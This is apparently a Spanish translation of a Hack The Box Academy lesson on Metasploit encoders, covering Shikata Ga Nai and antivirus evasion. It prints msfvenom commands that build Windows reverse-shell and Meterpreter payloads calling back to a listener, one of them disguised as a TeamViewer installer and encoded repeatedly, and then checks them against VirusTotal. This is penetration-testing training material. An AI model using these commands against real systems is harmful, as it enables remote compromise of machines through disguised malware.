...
Durante los 15 años de existencia del marco de metasploit,`Encoders`han ayudado a hacer que las cargas útiles compatibles con diferentes arquitecturas de procesadores y al mismo tiempo ayuden con la evasión de antivirus.`Encoders`Entra con el papel de cambiar la carga útil para ejecutarse en diferentes sistemas operativos y arquitecturas. Estas arquitecturas incluyen:

| **`x64`** | **`x86`** | **`sparc`** | **`ppc`** | **`mips`** |
| --- | --- | --- | --- | --- |

También son necesarios para eliminar los códigos de operación hexadecimales conocidos como`bad characters`de la carga útil. No solo eso, sino que codificar la carga útil en diferentes formatos podría ayudar con la detección de AV como se mencionó anteriormente. Sin embargo, el uso de codificadores estrictamente para la evasión AV ha disminuido con el tiempo, ya que los fabricantes de IPS/IDS han mejorado cómo su software de protección trata con firmas en malware y virus.

Shikata ga nai (`SGN`) es uno de los esquemas de codificación más utilizados hoy porque es muy difícil detectar que las cargas útiles codificadas a través de su mecanismo ya no son universalmente indetectables. Nada de eso. El nombre (`仕方がない`) medio`It cannot be helped`o`Nothing can be done about it`, y con razón, así que si estuviéramos leyendo esto hace unos años. Sin embargo, hay otras metodologías que exploraremos para evadir los sistemas de protección.[Este artículo de FireEye](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html)Detalla el por qué y el cómo de la regla anterior de Shikata Ga Nai sobre los otros codificadores.

---

# **Seleccionando un codificador**

Antes de 2015, el marco de MetaSploit tenía diferentes submódulos que se encargaron de las cargas útiles y los codificadores. Fueron empacados por separado del script msfconsole y se llamaron`msfpayload`y`msfencode`. Estas dos herramientas están ubicadas en`/usr/share/framework2/`.

Si quisiéramos crear nuestra carga útil personalizada, podríamos hacerlo a través de`msfpayload`, pero tendríamos que codificarlo de acuerdo con la arquitectura del sistema operativo objetivo utilizando`msfencode`después. Una tubería tomaría la salida de un comando y la alimentaría al siguiente, lo que generaría una carga útil codificada, lista para ser enviada y ejecutarse en la máquina de destino.

Codificadores

```
xnoxos@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)

my$buf = "\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
...
Después de 2015, las actualizaciones de estos scripts los han combinado dentro del`msfvenom`herramienta, que se encarga de la generación y codificación de carga útil. Estaremos hablando de`msfvenom`en detalle más adelante. A continuación se muestra un ejemplo de cómo se vería la generación de carga útil con`msfvenom`:

### **Generación de carga útil: sin codificar**

Codificadores

```
xnoxos@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perlFound 11 compatible encoders
...
```
xnoxos@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_naiFound 1 compatible encoders
...
### **Shikata ga nai codificación**

![](https://academy.hackthebox.com/storage/modules/39/shikata_ga_nai.gif)

Fuente: https://hatching.io/blog/metasploit-payloads2/

Si queremos ver el funcionamiento del`shikata_ga_nai`codificador, podemos ver una excelente publicación[aquí](https://hatching.io/blog/metasploit-payloads2/).

Supongamos que queremos seleccionar un codificador para un`existing payload`. Entonces, podemos usar el`show encoders`comando dentro del`msfconsole`para ver qué codificadores están disponibles para nuestro actual`Exploit module + Payload`combinación.
...
En el ejemplo anterior, solo vemos algunos codificadores adecuados para sistemas X64. Al igual que las cargas útiles disponibles, se filtran automáticamente de acuerdo con el módulo de explotación solo para mostrar las compatibles. Por ejemplo, probemos el`MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit`.
...
Tome el ejemplo anterior tal como ese, un ejemplo hipotético. Si tuviéramos que codificar una carga útil ejecutable solo una vez con SGN, lo más probable es que la mayoría de los antivirus la detectarían hoy. Vamos a profundizar en eso por un momento. Recoger`msfvenom`, El subíndice del marco que se ocupa de los esquemas de generación y codificación de la carga útil, tenemos la siguiente entrada:

Codificadores

```
xnoxos@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exeFound 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
...
Esto generará una carga útil con el`exe`Formato, llamado TeamViewerInstall.exe, que está destinado a funcionar en procesadores de arquitectura X86 para la plataforma Windows, con una carga útil de shell Widden Meterpreter Reverse_TCP, codificada una vez con el esquema Shikata GA NAI. Tomemos el resultado y lo subamos a Virustotal.
...
```
xnoxos@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exeFound 1 compatible encoders
...
Como podemos ver, todavía no es suficiente para la evasión AV. Hay una gran cantidad de productos que aún detectan la carga útil. Alternativamente, Metasploit ofrece una herramienta llamada`msf-virustotal`que podemos usar con una clave API para analizar nuestras cargas útiles. Sin embargo, esto requiere un registro gratuito en Virustotal.
...
```
xnoxos@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
...
Como se esperaba, la mayoría de los productos antivirus que encontraremos en la naturaleza aún detectarían esta carga útil, por lo que tendríamos que usar otros métodos para la evasión AV que están fuera del alcance de este módulo.